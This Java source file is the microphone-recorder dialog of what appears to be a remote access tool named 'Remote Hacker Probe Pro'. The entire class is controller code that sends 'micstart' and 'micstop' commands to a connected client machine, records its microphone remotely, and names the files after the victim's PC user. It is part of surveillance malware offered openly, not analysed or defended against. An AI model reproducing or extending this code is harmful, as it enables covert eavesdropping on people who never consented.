package rhp;

import java.awt.BorderLayout;
import java.awt.FlowLayout;

import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import javax.swing.JToggleButton;
import javax.swing.SwingUtilities;

import java.awt.event.ActionListener;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.concurrent.TimeUnit;
import java.awt.event.ActionEvent;
import java.awt.Font;
import javax.swing.SwingConstants;

public class MicRecorder extends JDialog {

	private final JPanel contentPanel = new JPanel();
	static Boolean Record = false;
	static JLabel lbl ;
	static JToggleButton jtb;
	public static int CLIENT_ID;
	public static Boolean MicRec = false;
	/**
	 * Launch the application.
	 */
	static ImageIcon mic = new ImageIcon("icons/mic.png");
	
	static ImageIcon micred = new ImageIcon("icons/micred.png");
	
	
	static String getAlphaNumericString(int n) 
    { 
  
        String AlphaNumericString = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                    + "0123456789"
                                    + "abcdefghijklmnopqrstuvxyz"; 
  
        StringBuilder sb = new StringBuilder(n); 
  
        for (int i = 0; i < n; i++) { 
            int index 
                = (int)(AlphaNumericString.length() 
                        * Math.random()); 
  
            sb.append(AlphaNumericString 
                          .charAt(index)); 
        } 
  
        return sb.toString(); 
    } 
	
	public static String MicFilename()
	{
		// rhp_username_random5letteralphanumericstring + .wav;
		return "rhp_" + Server.UserPC.get(CLIENT_ID).replace(" ", "").split("/")[0].strip() + "_"  + getAlphaNumericString(5) + ".wav";
	}
	
	public static void AnimateGui()
	{
  	  jtb.setIcon(micred);
  	  Record = true;
		new Thread(new Runnable()
		{
		    public void run()
		    {
		        long start = System.currentTimeMillis();
		        while (Record)
		        {
		            long time = System.currentTimeMillis() - start;
		            int seconds = (int) (time / 1000);
		            SwingUtilities.invokeLater(new Runnable() {
		                 public void run()
		                 {
		                	 lbl.setText("Now Recording for : " + seconds + " Seconds");
		                 }
		            });
		            try { Thread.sleep(100); } catch(Exception e) {}
		            
		            if(!Record) { break; }
		        }
		    }
		}).start();
	}

	/**
	 * Create the dialog.
	 */
	public MicRecorder() {
		
		MainWindow.HaltAllSystems();
		setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
		setResizable(false);
		setTitle("Remote Hacker Probe Pro | Mic Recorder");
		setBounds(100, 100, 299, 169);
		getContentPane().setLayout(new BorderLayout());
		contentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
		getContentPane().add(contentPanel, BorderLayout.CENTER);
		contentPanel.setLayout(null);
		
		
		jtb = new JToggleButton(mic);
		jtb.setToolTipText("Start Recording Microhpone");
		
		lbl = new JLabel("Press Button below to Record");
		lbl.setFont(new Font("Calibri", Font.PLAIN, 16));
		lbl.setHorizontalAlignment(SwingConstants.CENTER);
		lbl.setBounds(0, 11, 273, 65);
		contentPanel.add(lbl);
		
		jtb.addItemListener(new ItemListener() {
			   public void itemStateChanged(ItemEvent ev) {
				   MicRec = true;
			      if(ev.getStateChange()==ItemEvent.SELECTED){
			    	  Server.SendData(Server.Clients.get(CLIENT_ID), "micstart"); // send instruction to start mic recording
			    	  // expect no reply
			    	  // go to thread.java:359 for response handling and to animate gui
			    	  
			      } else if(ev.getStateChange()==ItemEvent.DESELECTED){
			    	  String fl = MicFilename();
			    	  Server.SendData(Server.Clients.get(CLIENT_ID), "micstop:"+fl);
			    	  jtb.setIcon(mic);
			    	  Record = false;
			    	  lbl.setText("Press Button below to Record");
			    	  try {
						TimeUnit.SECONDS.sleep(1);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					} // delay 1
			    	  
			      }
			   }
			});
		jtb.setBounds(10, 87, 263, 41);
		
		
		contentPanel.add(jtb);
		
		addWindowListener(new WindowAdapter() {
			
			@Override
			public void windowClosed(WindowEvent we) {
				MainWindow.EnableAllSystems();
			}
		});
		
		
	}
}
